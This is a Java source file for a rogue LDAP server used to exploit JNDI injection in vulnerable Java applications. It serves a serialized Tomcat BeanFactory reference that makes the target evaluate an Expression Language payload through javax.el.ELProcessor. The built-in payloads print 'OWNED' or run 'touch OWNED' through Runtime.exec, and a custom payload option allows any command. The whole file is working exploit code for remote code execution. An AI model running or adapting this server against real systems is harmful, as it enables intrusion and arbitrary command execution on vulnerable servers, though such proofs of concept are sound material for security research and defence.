import javax.naming.StringRefAddr;

import org.apache.naming.ResourceRef;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

import java.net.Inet6Address;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;


import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


//Gadgets credit: https://www.veracode.com/blog/research/exploiting-jndi-injections-java
//
//LDAP adapted from https://github.com/mbechler/marshalsec/ and
//https://github.com/feihong-cs/JNDIExploit


public class EvilLDAPServer {


    public static void main(String[] args) throws Exception {
        int port = 1389;
        String elpayload;

        if (args.length == 2) {
            port = Integer.parseInt(args[1]);
        }

        if (args.length > 0) {
            if (args[0].equals("echo")) {
                elpayload = "\"\".getClass().forName(\"java.lang.System\").getDeclaredField(\"out\").get(\"\".getClass().forName(\"java.lang.System\")).println(\"-------OWNED------\")";
            } else if (args[0].equals("touch")) {
                elpayload = "\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch OWNED\")";
            } else {
                System.out.println("Evil <echo|touch|CUSTOM_EL> [port]");
                return;
            }
        } else {
            System.out.println("Evil <echo|touch|CUSTOM_EL> [port]");
            return;
        }

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");

        config.setListenerConfigs(new InMemoryListenerConfig(
                    "listener",
                    Inet6Address.getByName("::"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(elpayload));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on all interfaces; port " + port);
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private String elpayload;
        public OperationInterceptor(String pl) {
            elpayload = pl;
        }

        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        public static byte[] serialize(Object ref) throws Exception {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(out);
            objOut.writeObject(ref);
            return out.toByteArray();
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            System.out.println("Send LDAP reference result for `" + base + "` - ELProcessor payload");
            e.addAttribute("javaClassName", "java.lang.String");

            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));

            ref.add(new StringRefAddr("x", elpayload));

            e.addAttribute("javaSerializedData", serialize(ref));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        }
    }
}

